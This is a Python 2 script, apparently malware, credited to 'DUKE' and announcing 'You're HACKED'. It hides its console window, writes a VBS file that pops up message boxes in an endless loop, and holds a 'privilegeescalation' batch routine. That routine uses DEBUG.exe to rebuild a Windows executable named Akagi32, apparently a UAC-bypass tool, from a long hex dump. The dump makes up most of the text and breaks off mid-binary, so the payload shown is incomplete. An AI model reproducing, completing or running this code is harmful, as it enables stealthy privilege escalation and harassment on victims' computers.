# -*- coding: utf-8 -*-
show = '''
........................................
........................................
........... Created by the Duke.........
........................................
........................................

    THE BEAST UNLEASED... You\'re HACKED

'''

__authour__ = 'DUKE'
import socket, os, sys
import base64
import threading
os.system('color 4')
import ctypes
from time import ctime
MyName = sys.argv[0]


global user32
kernel32 = ctypes.WinDLL('kernel32')
user32 = ctypes.WinDLL('user32')
hWnd = kernel32.GetConsoleWindow()
user32.ShowWindow(hWnd, 0)

print show

def Texter(TEXT, ICON, TITLE):
    f=open('temp.vbs', 'w')
    loophead = 'do\n'
    body =  'x=msgbox(\"'+TEXT+'\", '+ICON+',\"'+TITLE+'\" )\n'
    loopend = 'loop'
    f.write(loophead + body + loopend)
    os.popen('script temp.vbs')
    
def privilegeescalation(FILENAME):
	script = '''
debug /?
if NOT %ERRORLEVEL% == 0 echo &echo &echo &echo **** **** **** **** ****&echo *** Missing DEBUG.exe ***&echo **** **** **** **** ****&exit /b
echo n Akagi32.0>Akagi32.hex
echo e 0100>>Akagi32.hex
echo 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 08 01 00 00 0e 1f ba 0e 00 b4 09 cd 21 b8 01 4c cd 21 54 68 69 73 20 70 72 6f 67 72 61 6d 20 63 61 6e 6e 6f 74 20 62 65 20 72 75 6e 20 69 6e 20 44 4f 53 20 6d 6f 64 65 2e 0d 0d 0a 24 00 00 00 00 00 00 00>>Akagi32.hex
echo e 0180>>Akagi32.hex
echo 3d 39 27 29 79 58 49 7a 79 58 49 7a 79 58 49 7a ee 06 48 7b 7b 58 49 7a 42 06 4a 7b 7c 58 49 7a 42 06 4d 7b 73 58 49 7a a4 a7 87 7a 7a 58 49 7a a4 a7 99 7a 78 58 49 7a a4 a7 82 7a 6e 58 49 7a 79 58 48 7a d8 58 49 7a ee 06 41 7b 67 58 49 7a eb 06 b6 7a 78 58 49 7a 79 58 de 7a 78 58 49 7a ee 06 4b 7b 78 58 49 7a 52 69 63 68 79 58 49 7a 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>Akagi32.hex
echo e 0200>>Akagi32.hex
echo 00 00 00 00 00 00 00 00 50 45 00 00 4c 01 06 00 ab 28 08 59 00 00 00 00 00 00 00 00 e0 00 02 01 0b 01 0e 00 00 74 00 00 00 d8 00 00 00 00 00 00 2d 1a 00 00 00 10 00 00 00 90 00 00 00 00 40 00 00 10 00 00 00 02 00 00 06 00 01 00 06 00 01 00 06 00 01 00 00 00 00 00 00 90 01 00 00 04 00 00 41 10 02 00 02 00 40 81 00 00 10 00 00 10 00 00 00 00 10 00 00 10 00 00 00 00 00 00 10 00 00 00>>Akagi32.hex
echo e 0280>>Akagi32.hex
echo 00 00 00 00 00 00 00 00 7c b4 00 00 04 01 00 00 00 00 01 00 50 7d 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80 01 00 0c 08 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 b2 00 00 40 00 00 00 00 00 00 00 00 00 00 00 00 90 00 00 b4 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>Akagi32.hex
echo e 0300>>Akagi32.hex
echo 2e 74 65 78 74 00 00 00 7c 72 00 00 00 10 00 00 00 74 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 20 00 00 60 2e 72 64 61 74 61 00 00 62 34 00 00 00 90 00 00 00 36 00 00 00 78 00 00 00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 40 2e 64 61 74 61 00 00 00 c8 16 00 00 00 d0 00 00 00 06 00 00 00 ae 00 00 00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 c0 2e 67 66 69 64 73 00 00>>Akagi32.hex
echo e 0380>>Akagi32.hex
echo 04 00 00 00 00 f0 00 00 00 02 00 00 00 b4 00 00 00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 40 2e 72 73 72 63 00 00 00 50 7d 00 00 00 00 01 00 00 7e 00 00 00 b6 00 00 00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 40 2e 72 65 6c 6f 63 00 00 0c 08 00 00 00 80 01 00 00 0a 00 00 00 34 01 00 00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 42 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>Akagi32.hex
echo e 0400>>Akagi32.hex
echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>Akagi32.hex
echo e 0480>>Akagi32.hex
echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>Akagi32.hex
echo e 0500>>Akagi32.hex
echo 55 8b ec 83 ec 0c 56 8b 75 10 33 c0 89 55 f8 85 f6 74 02 89 06 85 c9 75 11 8b 45 08 85 c0 74 03 66 89 08 33 c0 e9 a5 00 00 00 8b 55 08 53 57 6a 20 5b 6a 22 5e 89 45 fc 89 75 f4 8b f8 eb 03 83 c1 02 66 39 19 74 f8 0f b7 01 85 c0 74 63 3b c6 75 05 83 c1 02 8b de 0f b7 01 66 3b c6 74 31 8b 75 f8 66 3b c3 74 29 66 85 c0 74 24 47 39 75 fc 75 12 81 ff 04 01 00 00 73 0a 85 d2 74 06 66 89>>Akagi32.hex
echo e 0580>>Akagi32.hex
echo 02 83 c2 02 83 c1 02 0f b7 01 66 3b 45 f4 75 d2 8b 5d fc 8d 41 02 33 f6 43 66 39 31 56 0f 44 c1 89 5d fc 3b 5d f8 8b c8 58 6a 22 5e 6a 20 5b 76 8a 8b 75 10 85 d2 74 05 33 c0 66 89 02 85 f6 74 02 89 3e 81 ff 04 01 00 00 5f 1b c0 f7 d8 5b 5e 8b e5 5d c3 55 8b ec 83 ec 0c 53 56 57 33 f6 8b fa 6a 0a 46 89 7d f4 5b 89 75 fc 8b c1 3b cb 72 0c 33 d2 f7 f3 46 3b c3 73 f7 89 75 fc 85 ff 74>>Akagi32.hex
echo e 0600>>Akagi32.hex
echo 36 8b de 85 f6 74 2a 83 ef 02 6a 0a 8d 04 77 89 45 f8 8b f8 5e 8b c1 33 d2 f7 f6 8b c8 8d 42 30 66 89 07 8d 7f fe 83 eb 01 75 ea 8b 75 fc 8b 7d f4 33 c0 66 89 04 77 5f 8b c6 5e 5b 8b e5 5d c3 56 8b f1 85 c9 75 12 33 c0 5e c3 83 c1 02 66 83 fa 5c 8b c1 0f 45 c6 8b f0 0f b7 11 66 85 d2 75 ea 8b c6 5e c3 85 c9 74 32 85 d2 74 2e 33 c0 eb 03 83 c1 02 66 39 01 75 f8 56 0f b7 32 66 85 f6>>Akagi32.hex
echo e 0680>>Akagi32.hex
echo 74 13 2b d1 66 89 31 83 c1 02 0f b7 04 0a 8b f0 66 85 c0 75 ef 33 c0 66 89 01 5e 8b c1 c3 3b ca 75 03 33 c0 c3 85 c9 75 04 83 c8 ff c3 85 d2 75 04 33 c0 40 c3 53 56 57 6a 19 2b ca 5b 0f b7 34 11 8d 46 bf 66 3b c3 77 06 8d 46 20 0f b7 f0 0f b7 3a 8d 47 bf 66 3b c3 77 08 8d 47 20 0f b7 c0 eb 02 8b c7 83 c2 02 66 85 f6 74 05 66 3b f0 74 cc 0f b7 c8 5f 0f b7 c6 5e 2b c1 5b c3 85 c9 74>>Akagi32.hex
echo e 0700>>Akagi32.hex
echo 2e 85 d2 74 2a 3b ca 74 26 56 57 0f b7 3a 8b f1 66 85 ff 74 13 2b d1 66 89 3e 83 c6 02 0f b7 04 32 8b f8 66 85 c0 75 ef 33 c0 5f 66 89 06 5e 8b c1 c3 33 c0 85 c9 74 0c eb 03 83 c1 02 66 39 01 75 f8 8b c1 c3 8b c1 85 c9 75 01 c3 33 d2 eb 03 83 c1 02 66 39 11 75 f8 2b c8 d1 f9 8b c1 c3 55 8b ec 51 89 4d fc 56 85 c9 74 3e 8b 75 08 85 f6 74 37 53 0f b7 1e 4a 57 8b f9 66 85 db 74 23 2b>>Akagi32.hex
echo e 0780>>Akagi32.hex
echo f1 8b 4d 0c 85 d2 74 17 85 c9 74 13 66 89 1f 83 c7 02 4a 49 0f b7 04 3e 8b d8 66 85 c0 75 e5 8b 4d fc 33 c0 66 89 07 5f 5b 8b c1 5e 8b e5 5d c3 55 8b ec 83 ec 0c 56 8b f2 3b ce 75 07 8b c1 e9 ce 00 00 00 85 c9 75 07 33 c0 e9 c3 00 00 00 85 f6 74 f5 0f b7 16 53 57 6a 19 5f 8d 42 bf 89 7d fc 66 3b c7 77 08 8d 42 20 0f b7 d8 eb 02 8b da 89 5d f4 66 85 db 0f 84 92 00 00 00 0f b7 01 66>>Akagi32.hex
echo e 0800>>Akagi32.hex
echo 85 c0 0f 84 86 00 00 00 0f b7 d0 8d 42 bf 66 3b c7 77 08 8d 42 20 0f b7 c0 eb 02 8b c2 66 3b c3 74 0b 83 c1 02 0f b7 01 66 85 c0 75 db 66 83 39 00 74 5b 8b de 8b d1 2b d9 0f b7 3a 8d 47 bf 66 3b 45 fc 77 08 8d 47 20 0f b7 c0 eb 02 8b c7 0f b7 3c 13 89 45 f8 8d 47 bf 66 3b 45 fc 77 08 8d 47 20 0f b7 c0 eb 02 8b c7 83 c2 02 66 39 45 f8 75 05 66 85 c0 75 c2 66 85 c0 74 0e 8b 5d f4 83>>Akagi32.hex
echo e 0880>>Akagi32.hex
echo c1 02 6a 19 5f e9 72 ff ff ff 8b c1 eb 02 33 c0 5f 5b 5e 8b e5 5d c3 55 8b ec 83 7d 0c 10 75 08 6a 00 ff 15 84 91 40 00 5d ff 25 a4 91 40 00 55 8b ec 83 e4 f8 81 ec dc 02 00 00 53 56 57 be 2c 93 40 00 c7 44 24 24 25 12 00 00 8d bc 24 80 00 00 00 c7 44 24 28 00 20 08 00 8b c1 c7 44 24 2c 08 00 08 00 33 db 89 44 24 10 a5 6a 28 59 89 18 8d 44 24 0c a5 50 66 89 4c 24 24 c7 44 24 34 08>>Akagi32.hex
echo e 0900>>Akagi32.hex
echo 00 00 00 a5 c7 44 24 38 00 00 00 20 89 5c 24 3c 89 5c 24 40 a5 be 3c 93 40 00 89 5c 24 44 8d bc 24 94 00 00 00 89 5c 24 48 89 5c 24 10 a5 a5 a5 33 f6 46 66 89 74 24 26 ff 15 70 92 40 00 f6 44 24 0c 01 0f 84 ed 04 00 00 53 ff 15 ac 92 40 00 85 c0 0f 88 d7 04 00 00 ff 15 58 90 40 00 b9 48 06 00 00 b8 80 e0 40 00 88 18 40 83 e9 01 75 f8 53 53 53 53 53 6a 02 ff 15 6c 92 40 00 a3 84 e0>>Akagi32.hex
echo e 0980>>Akagi32.hex
echo 40 00 85 c0 0f 84 a0 04 00 00 64 a1 18 00 00 00 bf 0a 02 00 00 89 1d 9c e0 40 00 8b cf 8b 40 30 8b 40 08 89 44 24 1c 8d 84 24 d8 00 00 00 89 5c 24 0c 88 18 40 83 e9 01 75 f8 8d 44 24 0c 50 51 8d 84 24 e0 00 00 00 50 ff 15 38 91 40 00 8b d6 8b c8 e8 29 fb ff ff 83 c4 0c 39 5c 24 0c 0f 84 3f 04 00 00 66 8b 84 24 d8 00 00 00 8d 94 24 d8 00 00 00 8b cb 66 85 c0 74 27 0f b7 c0 0f b7 f0>>Akagi32.hex
echo e 0a00>>Akagi32.hex
echo 8d 46 d0 66 83 f8 09 77 15 6b c9 0a 83 c2 02 8b c6 83 c0 d0 03 c8 0f b7 02 66 85 c0 75 df 33 f6 46 8b 44 24 10 89 08 85 c9 0f 84 f4 03 00 00 83 f9 20 0f 8d eb 03 00 00 a1 9c e0 40 00 83 f9 15 89 74 24 18 0f 44 c6 89 5c 24 14 a3 9c e0 40 00 8d 44 24 14 50 6a 08 89 5c 24 50 ff 15 30 91 40 00 50 ff 15 0c 92 40 00 85 c0 0f 89 f6 01 00 00 50 ff 15 f8 91 40 00 50 ff 15 d8 90 40 00 8d 84>>Akagi32.hex
echo e 0a80>>Akagi32.hex
echo 24 d8 00 00 00 88 18 40 83 ef 01 75 f8 8d 44 24 0c 89 5c 24 0c 50 51 8d 84 24 e0 00 00 00 50 ff 15 38 91 40 00 6a 02 5a 8b c8 e8 51 fa ff ff 8b 44 24 18 83 c4 0c 85 c0 74 16 8d 94 24 d8 00 00 00 a3 a4 e0 40 00 b9 bc e4 40 00 e8 2d fc ff ff 8b 74 24 1c 68 00 80 00 00 53 53 6a 02 68 00 7f 00 00 53 c7 44 24 68 30 00 00 00 c7 44 24 6c 20 00 00 00 c7 44 24 70 97 13 40 00 89 5c 24 74 89>>Akagi32.hex
echo e 0b00>>Akagi32.hex
echo 5c 24 78 89 74 24 7c 89 9c 24 80 00 00 00 ff 15 88 91 40 00 89 44 24 6c 8d 84 24 80 00 00 00 89 44 24 78 8d 44 24 50 50 89 5c 24 74 89 5c 24 78 89 9c 24 80 00 00 00 ff 15 98 91 40 00 53 56 53 53 6a 1e 6a 1e 53 53 68 00 00 00 96 8d 84 24 b4 00 00 00 50 8d 84 24 a8 00 00 00 50 6a 08 ff 15 8c 91 40 00 8b 35 20 91 40 00 68 48 93 40 00 89 44 24 14 ff d6 a3 8c e0 40 00 85 c0 0f 84 9d 02>>Akagi32.hex
echo e 0b80>>Akagi32.hex
echo 00 00 68 64 93 40 00 ff d6 8b 3d 28 91 40 00 a3 90 e0 40 00 85 c0 75 14 68 64 93 40 00 ff d7 a3 90 e0 40 00 85 c0 0f 84 73 02 00 00 68 78 93 40 00 ff d6 a3 94 e0 40 00 85 c0 75 14 68 78 93 40 00 ff d7 a3 94 e0 40 00 85 c0 0f 84 4f 02 00 00 51 ba a8 e0 40 00 b9 90 93 40 00 e8 ea 56 00 00 ba b2 e2 40 00 b9 c0 93 40 00 e8 db 56 00 00 c7 04 24 98 e0 40 00 53 53 ff 15 84 92 40 00 a1 98>>Akagi32.hex
echo e 0c00>>Akagi32.hex
echo e0 40 00 25 ff 3f 00 00 a3 98 e0 40 00 3d 58 1b 00 00 0f 82 00 02 00 00 ff 15 30 91 40 00 8b d0 85 d2 0f 84 94 00 00 00 6a 20 5e 8b ce 8d 84 24 9c 00 00 00 88 18 40 83 e9 01 75 f8 53 56 8d 84 24 a4 00 00 00 89 b4 24 a4 00 00 00 50 53 52 ff 15 d0 91 40 00 85 c0 78 63 8b 84 24 b8 00 00 00 d1 e8 24 01 eb 58 8d 44 24 48 50 6a 04 8d 44 24 20 50 6a 12 ff 74 24 24 ff 15 dc 91 40 00 8b f0>>Akagi32.hex
echo e 0c80>>Akagi32.hex
echo 56 ff 15 f8 91 40 00 50 ff 15 d8 90 40 00 ff 74 24 14 ff 15 48 92 40 00 33 c9 85 f6 0f 99 c1 85 c9 0f 84 d7 fd ff ff 83 7c 24 18 03 0f 84 cc fd ff ff b8 5e 06 00 00 e9 81 01 00 00 8a c3 ff 74 24 10 0f b6 c0 a3 80 e0 40 00 b8 95 3a 00 00 3b 05 98 e0 40 00 1b c0 25 fc ff fb ff 05 14 00 84 10 a3 a0 e0 40 00 ff 15 94 91 40 00 8b f8 8d 44 24 20 50 57 ff 15 74 90 40 00 8d 4c 24 20 51 50>>Akagi32.hex
echo e 0d00>>Akagi32.hex
echo 57 ff 15 7c 90 40 00 57 ff 15 5c 91 40 00 50 57 ff 15 6c 91 40 00 68 05 04 00 00 ff 15 68 91 40 00 68 00 41 00 00 ff 15 4c 91 40 00 68 01 17 00 00 ff 15 54 91 40 00 ff 15 60 91 40 00 6a 04 ff 15 64 91 40 00 53 6a 01 53 6a 01 ff 15 48 91 40 00 8b 35 70 91 40 00 6a ff 6a ff ff d6 6a 01 53 ff d6 6a ff 6a 01 ff d6 ff 15 50 91 40 00 8d 44 24 4c c7 44 24 4c 32 20 40 00 50 68 01 14 00 00>>Akagi32.hex
echo e 0d80>>Akagi32.hex
echo be 08 19 00 00 89 1d 40 d4 40 00 56 6a 01 6a 01 ff 15 58 91 40 00 68 40 d4 40 00 68 01 14 00 00 56 6a 01 6a 01 53 53 ff 15 44 91 40 00 57 ff 15 78 90 40 00 53 53 6a 10 ff 74 24 1c ff 15 90 91 40 00 53 53 53 8d 84 24 c8 00 00 00 50 ff 15 ac 91 40 00 8b f0 83 fe ff 74 20 8d 84 24 bc 00 00 00 50 ff 15 b0 91 40 00 8d 84 24 bc 00 00 00 50 ff 15 b4 91 40 00 85 f6 75 c8 ff 74 24 1c 8d 84>>Akagi32.hex
echo e 0e00>>Akagi32.hex
echo 24 84 00 00 00 50 ff 15 a8 91 40 00 a1 40 d4 40 00 a3 88 e0 40 00 eb 23 bb 61 06 00 00 eb 1c 6a 06 eb 09 b8 a0 00 00 00 eb 13 6a 08 5b eb 0c bb 4f 05 00 00 eb 05 bb e4 02 00 00 8b c3 5f 5e 5b 8b e5 5d c3 55 8b ec 51 83 65 fc 00 56 e8 e4 54 00 00 8d 4d fc e8 55 fa ff ff 8b f0 8b ce 81 e9 a0 00 00 00 74 2f 81 e9 44 02 00 00 74 20 81 e9 7a 03 00 00 74 11 83 e9 03 75 24 b9 70 94 40 00>>Akagi32.hex
echo e 0e80>>Akagi32.hex
echo e8 7f 52 00 00 eb 1c b9 18 94 40 00 eb f2 b9 d0 93 40 00 eb eb b9 c0 94 40 00 e8 65 52 00 00 85 f6 74 07 b8 4f 05 00 00 eb 1b e8 2a 53 00 00 8b 4d fc e8 05 3f 00 00 85 c0 74 04 33 c0 eb 06 ff 15 2c 91 40 00 5e 8b e5 5d c3 55 8b ec 57 8b 7d 08 8b 07 81 38 04 00 00 80 75 4b 8b 40 04 3b 05 44 d4 40 00 75 40 56 ff 15 78 92 40 00 8b f0 85 f6 74 20 81 7e 08 00 d0 40 00 74 07 8b 76 04 85>>Akagi32.hex
echo e 0f00>>Akagi32.hex
echo f6 75 f0 85 f6 74 0c 8b 46 0c 85 c0 74 05 ff d0 89 46 10 8b 47 04 5e 81 88 c0 00 00 00 00 00 01 00 83 c8 ff eb 02 33 c0 5f 5d c2 04 00 55 8b ec 83 ec 68 8d 45 e8 56 6a 14 59 c6 00 00 40 83 e9 01 75 f7 68 ca 19 40 00 6a 01 ff 15 80 92 40 00 8b f0 85 f6 74 66 8d 45 e8 c7 45 f0 00 d0 40 00 50 c7 45 f4 44 19 40 00 ff 15 64 92 40 00 ff 15 1c 91 40 00 f7 d0 89 45 fc 8d 45 fc 50 ff 15 7c>>Akagi32.hex
echo e 0f80>>Akagi32.hex
echo 92 40 00 6a 50 a3 44 d4 40 00 8d 4d 98 5a c6 01 00 41 83 ea 01 75 f7 89 45 9c 8d 45 98 50 c7 45 98 04 00 00 80 ff 15 68 92 40 00 56 ff 15 74 92 40 00 8d 45 e8 50 ff 15 fc 91 40 00 ff 75 f8 ff 15 24 91 40 00 cc 55 8b ec ff 75 08 6a 08 ff 35 84 e0 40 00 ff 15 e8 91 40 00 5d c3 55 8b ec 83 7d 08 00 74 11 ff 75 08 6a 00 ff 35 84 e0 40 00 ff 15 ec 91 40 00 5d c3 55 8b ec 8b 45 0c a8 02>>Akagi32.hex
echo e 1000>>Akagi32.hex
echo 74 07 b9 00 00 00 c0 eb 0f a8 01 b9 00 00 00 80 ba 00 00 00 40 0f 45 ca 56 c1 e8 08 6a 00 f7 d0 68 80 00 00 00 83 e0 01 83 c8 02 50 6a 00 6a 01 51 ff 75 08 ff 15 04 91 40 00 8b f0 83 fe ff 75 0b ff 15 2c 91 40 00 8b 4d 14 89 01 8b c6 5e 5d c3 55 8b ec 51 83 65 fc 00 8d 45 fc 6a 00 50 ff 75 10 ff 75 0c ff 75 08 ff 15 18 91 40 00 85 c0 75 15 83 4d fc ff 56 8b 75 14 85 f6 74 08 ff 15>>Akagi32.hex
echo e 1080>>Akagi32.hex
echo 2c 91 40 00 89 06 5e 8b 45 fc 8b e5 5d c3 55 8b ec 51 83 65 fc 00 8d 45 fc 6a 00 50 ff 75 10 ff 75 0c ff 75 08 ff 15 14 91 40 00 85 c0 75 15 83 4d fc ff 56 8b 75 14 85 f6 74 08 ff 15 2c 91 40 00 89 06 5e 8b 45 fc 8b e5 5d c3 55 8b ec 56 ff 75 08 33 f6 ff 15 fc 90 40 00 85 c0 75 12 8b 75 0c 85 f6 74 08 ff 15 2c 91 40 00 89 06 83 ce ff 8b c6 5e 5d c3 55 8b ec 56 ff 75 10 6a 00 ff 75>>Akagi32.hex
echo e 1100>>Akagi32.hex
echo 0c ff 75 08 ff 15 10 91 40 00 8b f0 83 fe ff 75 11 57 8b 7d 14 85 ff 74 08 ff 15 2c 91 40 00 89 07 5f 8b c6 5e 5d c3 55 8b ec 56 ff 75 08 33 f6 ff 15 00 91 40 00 85 c0 75 12 8b 75 0c 85 f6 74 08 ff 15 2c 91 40 00 89 06 83 ce ff 8b c6 5e 5d c3 33 c0 c3 55 8b ec 83 ec 3c 56 ff 75 1c ff 75 18 6a 00 6a 00 ff 75 08 e8 8b fe ff ff 8b f0 83 c4 14 83 fe ff 74 55 8d 45 c4 50 56 ff 15 0c 91>>Akagi32.hex
echo e 1180>>Akagi32.hex
echo 40 00 85 c0 74 34 8d 45 f8 50 8d 45 c8 50 ff 15 f8 90 40 00 85 c0 74 22 ff 75 10 8d 45 f8 ff 75 0c 50 ff 15 dc 90 40 00 85 c0 74 0e 8b 45 14 8b 4d c4 83 e1 27 66 89 08 eb 12 ff 75 1c ff 75 18 56 e8 05 ff ff ff 83 c4 0c 83 ce ff 8b c6 5e 8b e5 5d c3 55 8b ec 81 ec 08 02 00 00 8d 85 f8 fd ff ff ba 04 01 00 00 8b ca 53 33 db 88 18 40 83 e9 01 75 f8 8b ca 8d 85 fc fe ff ff 88 18 40 83>>Akagi32.hex
echo e 1200>>Akagi32.hex
echo e9 01 75 f8 8d 85 f8 fd ff ff 50 52 ff 15 08 91 40 00 85 c0 0f 84 8e 00 00 00 8d 85 fc fe ff ff 50 53 68 28 95 40 00 8d 85 f8 fd ff ff 50 ff 15 f0 90 40 00 85 c0 74 70 8d 85 fc fe ff ff 50 ff 15 00 91 40 00 8a 85 fc fe ff ff 8d 95 fc fe ff ff 84 c0 74 05 42 38 1a 75 fb 56 8d 8d fc fe ff ff 8b f2 2b f1 8b 4d 08 85 c9 74 38 39 5d 0c 74 33 84 c0 74 2d 8b c6 2b c2 03 45 0c 57 8d bd fc>>Akagi32.hex
echo e 1280>>Akagi32.hex
echo fe ff ff 2b f9 8d 94 05 fb fe ff ff 85 d2 74 11 85 f6 74 0d 8a 04 0f 88 01 41 4e 4a 38 1c 0f 75 eb 5f 88 19 33 db 43 5e 8b c3 5b 8b e5 5d c3 55 8b ec 81 ec 00 01 00 00 85 c9 75 07 33 c0 e9 ec 00 00 00 53 ba 00 01 00 00 8d 85 00 ff ff ff 33 db 88 18 40 83 ea 01 75 f8 53 53 68 fe 00 00 00 8d 85 00 ff ff ff 50 6a ff 51 53 53 ff 15 f4 90 40 00 85 c0 0f 84 b4 00 00 00 56 68 34 03 00 00>>Akagi32.hex
echo e 1300>>Akagi32.hex
echo 6a 08 ff 35 84 e0 40 00 ff 15 e8 91 40 00 8b f0 85 f6 0f 84 95 00 00 00 8d 8e 2e 01 00 00 85 c9 74 28 8d 85 00 ff ff ff 3b c8 74 1e 8a 95 00 ff ff ff 84 d2 74 12 57 8b f8 2b f9 88 11 41 8a 04 0f 8a d0 84 c0 75 f4 5f 88 19 53 8d 46 0c 50 68 d3 1c 40 00 68 27 1c 40 00 68 f5 1b 40 00 68 cb 1b 40 00 68 8e 1b 40 00 68 51 1b 40 00 68 f8 1a 40 00 68 dc 1a 40 00 68 c6 1a 40 00 68 51 1c 40>>Akagi32.hex
echo e 1380>>Akagi32.hex
echo 00 56 c7 00 ff ff ff 7f ff 15 6c 90 40 00 83 c4 34 89 86 30 03 00 00 85 c0 75 10 56 53 ff 35 84 e0 40 00 ff 15 ec 91 40 00 8b f3 8b c6 5e 5b 8b e5 5d c3 55 8b ec 81 ec 04 02 00 00 8b c1 53 33 db 89 45 fc 85 c0 0f 84 94 00 00 00 56 be 00 01 00 00 8d 85 fc fd ff ff 57 8b fe 88 18 40 83 ef 01 75 f8 8b 3d f4 90 40 00 8d 85 fc fd ff ff 53 53 68 fe 00 00 00 50 6a ff 52 53 53 ff d7 85 c0>>Akagi32.hex
echo e 1400>>Akagi32.hex
echo 74 5c 8d 85 fc fe ff ff 88 18 40 83 ee 01 75 f8 53 53 68 fe 00 00 00 8d 85 fc fe ff ff 50 6a ff ff 75 08 53 53 ff d7 85 c0 74 33 53 68 54 1c 40 00 68 51 1c 40 00 68 51 1c 40 00 53 8d 85 fc fe ff ff 50 8d 85 fc fd ff ff 50 8b 45 fc ff b0 30 03 00 00 ff 15 68 90 40 00 83 c4 20 8b d8 5f 5e 8b c3 5b 8b e5 5d c3 56 8b f1 85 f6 74 36 68 51 1c 40 00 68 51 1c 40 00 6a 00 ff b6 30 03 00 00>>Akagi32.hex
echo e 1480>>Akagi32.hex
echo ff 15 60 90 40 00 ff b6 30 03 00 00 ff 15 64 90 40 00 83 c4 14 56 6a 00 ff 35 84 e0 40 00 ff 15 ec 91 40 00 5e c3 cc cc cc 55 8b ec 83 ec 0c 53 56 57 8b 7d 0c 33 f6 89 55 f8 89 4d f4 89 75 fc 85 ff 74 02 89 37 8b 5d 08 85 db 74 5c 6a 04 68 00 30 00 00 8d 45 0c 89 5d 0c 50 56 8d 45 fc 50 6a ff ff 15 5c 92 40 00 85 c0 78 3d 39 75 fc 74 38 57 ff 75 f8 ff 75 f4 53 ff 75 fc 6a 02 ff 15>>Akagi32.hex
echo e 1500>>Akagi32.hex
echo 58 92 40 00 85 c0 74 1a 68 00 80 00 00 8d 45 0c 89 75 0c 50 8d 45 fc 50 6a ff ff 15 60 92 40 00 eb 03 8b 75 fc 8b c6 eb 02 33 c0 5f 5e 5b 8b e5 5d c3 6a 24 68 30 b4 40 00 e8 e2 4f 00 00 33 f6 89 75 d8 89 75 e4 89 75 dc 89 75 fc 8b de 89 5d cc 8b 7d 0c 89 7d e0 6a 04 68 00 30 00 00 8d 45 e0 50 56 8d 45 e4 50 6a ff ff 15 5c 92 40 00 85 c0 0f 88 85 00 00 00 8b 4d e4 85 c9 74 7e 57 ff>>Akagi32.hex
echo e 1580>>Akagi32.hex
echo 75 08 8b d7 e8 38 4a 00 00 59 59 8b 75 e4 85 f6 74 26 85 ff 74 22 ba 61 6b 61 6e 8b cf 89 4d d0 89 75 d4 0f b6 06 33 c2 88 06 d1 c2 46 89 75 d4 83 e9 01 89 4d d0 75 eb 8b 75 e4 8d 4e 04 8d 57 fc 8d 45 d8 50 ff 36 e8 dd fe ff ff 59 59 89 45 dc 85 c0 74 25 8b 55 d8 8b c8 e8 93 4a 00 00 84 c0 74 08 33 db 43 89 5d cc eb 0f ba 43 01 00 00 b9 2c 95 40 00 e8 f7 45 00 00 33 f6 83 4d fc ff>>Akagi32.hex
echo e 1600>>Akagi32.hex
echo 83 7d e4 00 74 18 89 75 e0 68 00 80 00 00 8d 45 e0 50 8d 45 e4 50 6a ff ff 15 60 92 40 00 85 db 75 23 39 5d dc 74 1b 89 75 e0 68 00 80 00 00 8d 45 e0 50 8d 45 dc 50 6a ff ff 15 60 92 40 00 89 75 dc 89 75 d8 8b 4d 10 85 c9 74 05 8b 45 d8 89 01 8b 45 dc eb 0d 33 c0 40 c3 8b 65 e8 83 4d fc ff 33 c0 e8 f4 4e 00 00 c3 55 8b ec 83 ec 7c 53 56 33 db 8b f1 89 5d fc 89 5d f8 57 85 f6 0f 84>>Akagi32.hex
echo e 1680>>Akagi32.hex
echo f6 00 00 00 39 5d 08 0f 84 ed 00 00 00 39 5d 0c 0f 84 e4 00 00 00 85 d2 0f 84 dc 00 00 00 6a 50 59 8d 45 88 88 18 40 83 e9 01 75 f8 8d 46 04 89 5d ec 89 45 e4 8d 75 e4 8d 42 fc 89 45 e8 8d 45 88 50 83 ec 0c 8b fc a5 a5 a5 ff 15 bc 91 40 00 85 c0 0f 84 96 00 00 00 6a 0c 59 8d 45 d8 88 18 40 83 e9 01 75 f8 6a 08 59 8d 45 f0 88 18 40 83 e9 01 75 f8 8d 45 f0 50 83 ec 0c 8d 75 e4 8b fc>>Akagi32.hex
echo e 1700>>Akagi32.hex
